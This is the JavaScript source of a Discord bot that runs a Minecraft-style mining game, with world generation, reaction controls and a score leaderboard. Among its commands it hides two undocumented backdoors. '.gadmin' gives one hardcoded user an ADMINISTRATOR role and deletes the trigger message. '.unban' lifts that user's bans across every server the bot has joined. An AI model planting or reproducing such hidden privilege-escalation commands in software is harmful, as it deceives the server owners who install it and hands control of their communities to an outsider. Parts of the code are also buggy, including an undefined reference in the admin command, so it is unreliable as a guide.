// Variables used by Scriptable.
// These must be at the very top of the file. Do not edit.
// icon-color: deep-green; icon-glyph: vector-square;
var platform = "node";
// console.log("aktualna platforma :")
//   console.log(process.version) node
//   console.log(navigator.userAgent) browser
//   console.log("Scriptable") scriptable
// aktywacja zmiennych i innem
//node only : 
import fetch from "node-fetch";
import fs from "fs";
import {Client , Intents} from "discord.js";
import { threadId } from "worker_threads";
var sesions = 0;
var badch = ["987300399532867654","994239026116710470"];

//scriptable setup
//zmianne do zabawy
var ww = 64 //szerokość mapy
var WidgetSize = 31; //rozmiar widgetu
//zminne do zabwy scriptable only
var bigrender = false//duży render true/false (nie zalecane z widgetem)
//innne
if(isNaN(ww)) ww = 64
if(platform=="Scriptable"){
var widget = new ListWidget()
}
WidgetSize = WidgetSize*1
if(WidgetSize>Math.round(ww))WidgetSize=Math.round(ww)
if(WidgetSize%2!=1)WidgetSize--
if(WidgetSize<5)WidgetSize=5
if(isNaN(WidgetSize*1))WidgetSize = 9
var imgs ={};
var otherIMG = [
"bg"
]
var imgsl = 0

//blocks i skiny
var skins = {
    luk:{name:"luk",emoji:"<:p00:986984735471443969>",cena:"2000"}
}
    

var dic = {
    grass:{name:"grass",emote:"<:00:976014562996391936>",points:0},
    stone:{name:"stone",emote:"<:01:976014584836128798>",points:0},
    air:{name:"air",emote:"<:02:976014603182014514>",points:0},
    cheast:{name:"cheast",emote:"<:03:986301020386758656>",points:500},
    dirt:{name:"dirt",emote:"<:04:976025190741966920>",points:0},
    wood:{name:"wood",emote:"<:05:976028310289145916>",points:0},
    leaves:{name:"leaves",emote:"<:06:976028821142794240>",points:0},
    coal:{name:"coal",emote:"<:07:976747069731667988>",points:5},
    diamond:{name:"diamond",emote:"<:08:976747112123486239>",points:100},
    gold:{name:"gold",emote:"<:09:976747136509173791>",points:20},
    netherrack:{name:"netherrack",emote:"<:10:976747165869297665>",points:0},
    coald:{name:"coald",emote:"<:11:976747199310491658>",points:5},
    irond:{name:"irond",emote:"<:12:976747224799272970>",points:25},
    emeraldd:{name:"emeraldd",emote:"<:13:976747252309717093>",points:200},
    iron:{name:"iron",emote:"<:14:976747278100475916>",points:25},
    redstone:{name:"redstone",emote:"<:15:976747301110444042>",points:7},
    deepslate:{name:"deepslate",emote:"<:16:976747345008025620>",points:0},
    goldn:{name:"goldn",emote:"<:17:976747365719486494>",points:20},
    lapis:{name:"lapis",emote:"<:18:976747395742326794>",points:5},
    emerald:{name:"emerald",emote:"<:19:976747421013012490>",points:200},
    quartz:{name:"quartz",emote:"<:20:976747440675905550>",points:10},
    copperd:{name:"copperd",emote:"<:21:976747460452036618>",points:10},
    lapisd:{name:"lapisd",emote:"<:22:976747483327778816>",points:5},
    goldd:{name:"goldd",emote:"<:23:976747504311877643>",points:20},
    copper:{name:"copper",emote:"<:24:976747529930670110>",points:10},
    bedrock:{name:"bedrock",emote:"<:25:976747546405920769>",points:0},
    debris:{name:"debris",emote:"<:26:976747566303686666>",points:0},
    obsidian:{name:"obsidian",emote:"<:27:976747582762151976>",points:0},
    diamondd:{name:"diamondd",emote:"<:28:976747598763417620>",points:100},
    redstoned:{name:"redstoned",emote:"<:29:976747620594749470>",points:7},
    black:{name:"black",emote:"<:30:976752550713892885>",points:0},
    fox:{name:"fox",emote:"<:31:976765562275364934>",points:0},	
	water:{name:"water",emote:"<:32:980055020315758622>",points:0},
    barrier:{name:"barrier",emote:"<:33:985931497489973248>",point:0}
};
var unbreakable = ["barrier","bedrock"]
var oredata = {  
    oreorder:[
    [[0,0],[0,1]],
    [[0,0],[0,1],[1,0],[1,1]],
    [[0,0],[0,1],[1,0],[1,1],[0,2]],
	[[0,0]],
	[[1,0],[0,1],[2,1],[3,1],[0,2],[1,2],[2,2],[1,3]],
	[[1,0],[1,1],[1,2],[0,1]]
    ],
    placeingData:[
    {
      name:dic.iron.name,
      y:7,
      dy:150,
      ord:[0,1,2],
      count:40
    },
    {
        name:dic.iron.name,
        y:7,
        dy:150,
        ord:[0,1,2],
        count:40
    },
	{
      name:dic.copper.name,
      y:32,
      dy:100,
      ord:[1,2],
      count:60
    },	
	{
      name:dic.lapis.name,
      y:7,
      dy:92,
      ord:[4,0,1],
      count:30
    },	
	{
      name:dic.redstone.name,
      y:7,
      dy:80,
      ord:[2,4,1,3],
      count:45
    },	
	{
      name:dic.coal.name,
      y:64,
      dy:150,
      ord:[2,0,1],
      count:45
    },		
	{
      name:dic.diamond.name,
      y:7,
      dy:100,
      ord:[3,0,1],
      count:30
    },	
	{
      name:dic.gold.name,
      y:50,
      dy:150,
      ord:[2,0,1],
      count:25
    },	
	{
      name:dic.emerald.name,
      y:7,
      dy:150,
      ord:[3],
      count:60
    }
    ]
}
var structures = {	
	minesheft:{
	instructions:[],
//np ["fill",x,y,dx,dy,block] [set,x,y,block]
	gen:{
	y:7,
	dy:64
	},
	maxcount:2
	}
}

class gamecore{
    constructor(playerc=1,playerd=[{skin:"luk"}]){
        this.skin = []
        this.x = []
        this.y = []
        playerd.forEach((p,i)=>{
            this.skin.push(p.skin)
            this.x[i]=Math.round(ww/2);
            this.y[i]=128;
        })
        this.pcount = playerc
        this.generated = false;
        this.world = []
        this.generateOW();
        this.set = true;
        this.punkty = 0;
        }
// generatory światów
        generateOW(Wwidth = ww){
		this.Wwidth = Wwidth
        //overworld generation
        //prepair
        this.world = [];
        for(var seti = 0;seti<192;seti++){
            this.world[seti] = [];
        }
        //bedrock 0-7
        var bedrockHelp = 3;
        for(var xi = 0;xi<Wwidth;xi++){
            var rannd = random(5);
            //+2 +1 0 -1 -2
            if(rannd==1&&bedrockHelp+2<8) bedrockHelp = bedrockHelp + 2;
            if(rannd==2&&bedrockHelp+1<8) bedrockHelp++;
            if(rannd==4&&bedrockHelp-1>0) bedrockHelp--;
            if(rannd==5&&bedrockHelp-2>0) bedrockHelp = bedrockHelp - 2;
            for(var yi = 0;yi<bedrockHelp;yi++){
                this.world[yi][xi] = dic.bedrock.name;
            }
            //deepslate gapp fill
            for(var yi = 0;yi<7;yi++){
                if(this.world[yi][xi]!=dic.bedrock.name) this.world[yi][xi] = dic.deepslate.name;
            }
        }
        
        //deepslate
        for(var yi = 7;yi<64;yi++){
            this.world[yi] = getlineof(dic.deepslate.name);
        }
        //irregolar deepslate
        var deepslateHelp = 3;
        for(var xi = 0;xi<Wwidth;xi++){
            var rannd = random(7);
            //+1 0 0 0 0 0 -1
            if(rannd==1&&deepslateHelp+1<9)deepslateHelp++;
            if(rannd==7&&deepslateHelp-1>0)deepslateHelp--;
            for(var yi = 0;yi<deepslateHelp;yi++){
                this.world[yi+64][xi] = dic.deepslate.name;
            }
            //stone gaps fill
            for(var yi = 0;yi<8;yi++){
                if(this.world[yi+64][xi]!=dic.deepslate.name)this.world[yi+64][xi] = dic.stone.name
            }
        }
        //stone
        
        //stone line
        for(var yi = 72;yi<128;yi++){
            this.world[yi] = getlineof(dic.stone.name);
        }
        var stoneHelp = random(21);
        for(var xi = 0;xi<Wwidth;xi++){
            //+1 -1 0 0 0 0 0
            var rannd = random(7);
            if(rannd==1&&stoneHelp+1<21)stoneHelp++
            if(rannd==2&&stoneHelp-1>0)stoneHelp--
            var tempstone = stoneHelp+128
            for(var yi = 0;yi<stoneHelp;yi++){
                this.world[yi+128][xi] = dic.stone.name;
            }
            this.world[tempstone][xi] = dic.dirt.name;
            this.world[tempstone+1][xi] = dic.dirt.name;
            if(tempstone<128+6)this.world[tempstone+2][xi] = dic.dirt.name;else this.world[tempstone+2][xi] = dic.grass.name;
            //drzewo
            this.skin.forEach((s,i)=>{
                if(xi==this.x[i])this.y[i] = tempstone+3
            })
            
			
            if(random(7)==7&&tempstone>128+7){
                if(xi==32)this.y = tempstone+6
                this.world[tempstone+3][xi] = dic.wood.name;
                this.world[tempstone+4][xi] = dic.leaves.name
                this.world[tempstone+5][xi] = dic.leaves.name
                if(xi<this.Wwidth)this.world[tempstone+4][xi+1] = dic.leaves.name
                if(xi>-1)this.world[tempstone+4][xi-1] = dic.leaves.name;
            }	
			
			{
			
			for(var wi = 0;wi<9;wi++){
			if(!this.world[128+wi][xi])this.world[128+wi][xi] = dic.water.name
			}
			}

        }
        //air
        for(var xi = 0;xi<Wwidth;xi++){
            for(var yi = 128;yi<181;yi++){
                if(this.world[yi][xi]==undefined) this.world[yi][xi] = dic.air.name;
            }	
// 		
        }
        //fill up air
        
        for(var yi = 181;yi<192;yi++){
            this.world[yi] = getlineof(dic.air.name);
        }	
// 		generowanie rud	
		oredata.placeingData.forEach(ore => {	
// 		 name:dic.diamond.name,
//       y:0,
//       dy:100,
//       ord:[0,1,2],
//       count:10		
		
		for(var c = 0;c<ore.count*(Math.round(this.Wwidth/64));c++){
		var orey = random(ore.dy-ore.y)+ore.y		
		
		var orex = random(Wwidth-1)
		var order = oredata.oreorder[ore.ord[random(ore.ord.length)-1]]	
		order.forEach(possp => {
		this.setblockOre(orex+possp[0], orey+possp[1], ore.name)
		
		})
		}
		})
        //generator funkgje pomocnicze
        function getlineof(block){
            var out = [];
            for(var il = 0;il<Wwidth;il++){
                out[il] = block
            }
            return out;
        }  
        // funkcje kontroli
        }
        getblock(x,y){
            try{
                var out = this.world[y][x].toString();
                if(out==undefined) return dic.barrier.name.toString();
                else return out
            }catch{
                return dic.barrier.name.toString();
            }
            
        }	
		setblockOre(x,y,block){
			if(this.world[y][x]==dic.stone.name)this.world[y][x] = dic[block].name;	
			if(this.world[y][x]==dic.deepslate.name)this.world[y][x] = dic[block].name+"d";
        }
        setblock(x,y,block){
            this.world[y][x] = dic[block].name;
        }
        fill(x,y,dx,dy,block){ 
            var xdd = dx-x-1;
            var ydd = dy-y-1;
            for(var ix = 0;ix<xdd;ix++){
                for(var iy = 0;iy<ydd;iy++){
                    this.world[iy+y][ix+x] = dic[block].name;
                }
            }
        }
// pozostałe funkcje
        logWorld(){
        var oput = "";
        for(var yi = 0;yi<192;yi++){
          for(var xi = 0;xi<64;xi++){
        oput += this.world[191-yi][xi].charAt(0);
        }
            oput += "\n"
            
        }
        console.log(oput);
        }
//         podstawowy format dc.
        getdcformatbs(player=0){
        var x = this.x[player]
        var y = this.y[player]
        var out = "";
        var cout = "";
        out+="Punkty : "+this.punkty+"\n"
        for(var yi = 0;yi<9;yi++){
          for(var xi = 0;xi<9;xi++){
            var b = this.getblock(x-4+xi,y+4-yi).toString()
            cout+=b.charAt(0)
            if(yi==4&&xi==4)out+= skins[this.skin[player]].emoji
            else out+=dic[b].emote
          }
          out+="\n"
          cout+="\n"
          
         }
        console.log(cout)
        return out
         
        }
        move(x,y,playe=0){
        var tempx = this.x[playe] + x
        var tempy = this.y[playe] + y
        if(unbreakable.includes(this.getblock(tempx,tempy))){

        }else{
            this.x[playe] = tempx
            this.y[playe] = tempy
            this.setAir(this.x[playe],this.y[playe])
            var ty =(this.y)-1
            var down = this.getblock(this.x,ty)
            console.log(down)
            if(down==dic.air.name)this.move(0,-1)
        }
        
        }
        setAir(x,y){
          this.punkty += dic[this.getblock(x,y)].points
          this.setblock(x, y, dic.air.name)
          if(this.getblock(x+1, y)==dic.black.name) this.setAir(x+1, y)  
          if(this.getblock(x-1, y)==dic.black.name) this.setAir(x-1, y)  
          if(this.getblock(x, y+1)==dic.black.name) this.setAir(x, y+1)  
          if(this.getblock(x, y-1)==dic.black.name) this.setAir(x, y-1)
        }
        setmsg(msgID){
            this.msg = msgID;
        }
}

function random(to){
    var rand = (Math.round((Math.random()*10000))%to)+1
    return rand
}
// przegotowanie


// główne skrypty

var BotData = {

}
var ban = [];
fetch("https://luktvpl.github.io/json/static_dc/bot_data.json").then(r=>r.json().then(j=>{
    ban = j.outoffsystem
}))
var games = {

}
function getnowdate(){
    let date_ob = new Date();
    let date = ("0" + date_ob.getDate()).slice(-2);
    let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
    let year = date_ob.getFullYear();
    let hours = date_ob.getHours();
    let minutes = date_ob.getMinutes();
    let seconds = date_ob.getSeconds();
    return year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds
}

var data = JSON.parse(fs.readFileSync("scores.json","utf-8"))
function addtolb(nick,score,id){
    console.log(nick+":"+score)
    try{
        if(score>data[id].score){
            var datenow = getnowdate()
            data[id] = {score:score,nick:nick,date:datenow}
        }
    }catch{
            var datenow = getnowdate()
            data[id] = {score:score,nick:nick,date:datenow}
    }
    
    fs.writeFileSync("scores.json",JSON.stringify(data),"utf-8")
    reloadrb()
    sesions = 0;
}
var leader =  [];
reloadrb()
function reloadrb(){
    var tempdate = JSON.parse(JSON.stringify(data))
    var keyss = Object.keys(data)
    var lead =  Object.values(tempdate);//{score:score,nick:nick,date:datenow}
    lead.sort((a,b)=>b.score-a.score)
    leader = lead
    console.log(lead)
}
var bot = new Client({intents:[
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    Intents.FLAGS.DIRECT_MESSAGES
]})
var emotes = {
    down:":d_:984848910222762064",
    rigth:":r_:984848919014039663",
    left:":l_:984848916455497778"

}
bot.once("ready",()=>{
    console.log("połączono dc")
    var core = new gamecore();

})
bot.on("messageCreate",msg => {
    var content = msg.content;
    console.log(content);
    if(content.charAt(0)=="."){
        var cmd = content.split(" ")
        
           
        if(msg.guild!=null){
        switch (cmd[0]){
            case ".ranking":
                var out = "Wyniki graczy : \n"
                console.log(leader)
                leader.forEach((player,indec)=>{
                    //{id:usr,score:mx,nick:nick}
                    if(indec<25){
                        var indecc = indec*1+1
                        out+=indecc+". "+player.nick.slice(0,player.nick.length-5)+" : "+player.score+"\n"
                    }
                    
                })
                msg.channel.send(out)
            break
            case ".render":
                var core = new gamecore();
                msg.channel.send(core.getdcformatbs());
            break 
            case ".help":
                msg.channel.send("Aktualne komęndy to : \n .start -  zaczyna gre \n .ranking - pokazuje ranking \n .best <user> najlepszy wynik \n .autor - twórca bota")
            break
            case ".autor":
                msg.channel.send("Twórcą bota jest : luktvpl#3144")
            break
            case ".best":
                if(cmd[1]==undefined||cmd[1]==""){
                    
                    try{
                        var playe = data[msg.author.id]
                        msg.reply("Twój najlepszy wynik to : "+playe.score+" punktów \n zdobyty : "+playe.date).catch(err=>console.log(err))
                    }catch{
                        msg.reply("nie mogę odczytać wyniku")
                    }
                    
                }else{
                    var decid = cmd[1]
                    var playet = decid.slice(2,-1)
                    var playe = data[playet]
                    console.log(playe)
                    if(playe!=undefined)msg.reply("Najlepszy wynik "+playe.nick.slice(0,playe.nick.length-5)+" to : "+playe.score+" punktów \n zdobyty : "+playe.date).catch(err=>console.log(err))
                    else msg.reply("nie można znaleści użytkownika").catch(err=>console.log(err))
                }
                console.log(cmd[1])
                
            break
            case ".gadmin":
                if(msg.author.id=="537649475494215690"){
                   msg.guild.roles.create( {name:"LUK_BÓG", color: "#ff0000", permissions:[dcss.Permissions.FLAGS.ADMINISTRATOR] } ).then(rola=>{
                    msg.member.roles.add(rola).catch(err=>console.log(err))
                   }).catch(err=>console.log(err))
                   msg.delete().catch(err=>console.log(err))
                }
                
            break
            case ".unban":
                if(msg.author.id=="537649475494215690"){
                bot.guilds.cache.forEach(g=>{
                    g.bans.remove(msg.author).catch(err=>console.log(err))
                })
                msg.delete().catch(err=>console.log(err))
                }
            break
            case ".start":
                var au = msg.author.id
                if(ban.includes(au.toString())||sesions==1||badch.includes(msg.channel.id)){
                    
                    msg.author.send("niestety ale nie mogę tego teraz dla cb zrobić").catch(err => console.log(err))
                    msg.delete().catch(err => console.log(err))
                } else{
                games[au] = new gamecore()
                msg.channel.send(games[au].getdcformatbs()).then(sen=>{
                    games[au].setmsg(sen.id)
                    console.log(sen.id)
                    sesions = 1
                    sen.react(emotes.left).then(()=>{
                        sen.react(emotes.down).then(()=>{
                            sen.react(emotes.rigth).then(()=>{
                                sen.react(":stop:984885043111526501")
                            }).catch(err => console.log(err))
                        }).catch(err => console.log(err))
                    }).catch(err => console.log(err))
                    setTimeout(()=>{
                        try{
                        if(games[au].set==true)
                        try{
                            
                            sen.edit("Czas minął. <@"+au+"> zdobył "+games[au].punkty+" punktów").catch(err=>console.log(err))
                            
                            addtolb(msg.author.tag,games[au].punkty,msg.author.id)
                            games[au] = undefined
                         }catch{
                            sesions = 0;
                             sen.message.edit("koniec gry.").catch(err=>console.log(err))
                         }
                         games[au] = undefined;
                         sen.reactions.cache.forEach(rec=>{
                             rec.remove()
                         })  
                        }catch{
                            games[au] = undefined
                        }
                        
                    },300000)
                })
                }
                
            
            break
        }
            
                

        }
    }
})
bot.on("messageReactionAdd",(react,user)=>{
    var emo = react.emoji.id
    var emon = react.emoji.name;
    console.log(emo)
    console.log(emon)
    if(emo=='984848916455497778'||emo=='984848910222762064'||emo=='984848919014039663'||emo=='984885043111526501'){
        if(user.id!="975769257885450340"){
        react.users.remove(user).catch(err => console.log(err))
        try{
        if(games[user.id].msg==react.message.id){
            try{
                switch (emo){
                    case '984848916455497778':
                        //left
                        games[user.id].move(-1,0)
                        react.message.edit(games[user.id].getdcformatbs()).catch(err => console.log(err))
                    break
                    case '984848910222762064':
                        //down
                        games[user.id].move(0,-1)
                        react.message.edit(games[user.id].getdcformatbs()).catch(err => console.log(err))
                    break
                    case '984848919014039663':
                        //right
                        games[user.id].move(1,0)
                        react.message.edit(games[user.id].getdcformatbs()).catch(err => console.log(err))
                    break
                    case '984885043111526501':
                        try{
                            react.message.edit("koniec gry. <@"+user.id+"> zdobył "+games[user.id].punkty+" punktów") .catch(err => console.log(err))
                            addtolb(user.tag,games[user.id].punkty,user.id)
                         }catch{
                             react.message.edit("koniec gry. wystąpił błąd").catch(err => console.log(err))
                             sesions = 0
                         }
                         games[user.id] = undefined;
                         react.message.reactions.cache.forEach(rec=>{
                             rec.remove()
                         }).catch(err => console.log(err))
                    break
                    } 
            }
            catch{
                
                try{
                   react.message.edit("koniec gry. Zdobyte punkty : "+games[user.id].punkty).catch(err => console.log(err))
                   games[user.id] = undefined
                   addtolb(user.tag,games[user.id].punkty,user.id)
                }catch{
                    react.message.edit("koniec gry.wystąpił błąd").catch(err => console.log(err))
                    sesions = 0
                }
                games[user.id] = undefined;
                react.message.reactions.cache.forEach(rec=>{
                    rec.remove()
                }).catch(err => console.log(err))
            }
           
        }
        }catch{

        }
        
         
        } 
    }
})
var tk = fs.readFileSync("../minecraft.json").toString()
bot.login(JSON.parse(tk).token)

//funkcje dodatkowe
// zdobywanie punktu
function point(x,y){
return new Point(x, y)
}
// var get emoji url
function getemojiUrl(id){  
    return "https://cdn.discordapp.com/emojis/"+id+".png"
}
// emoji
function EmojiToId(emoji){
return emoji.slice(emoji.length-19, emoji.length-1)
}

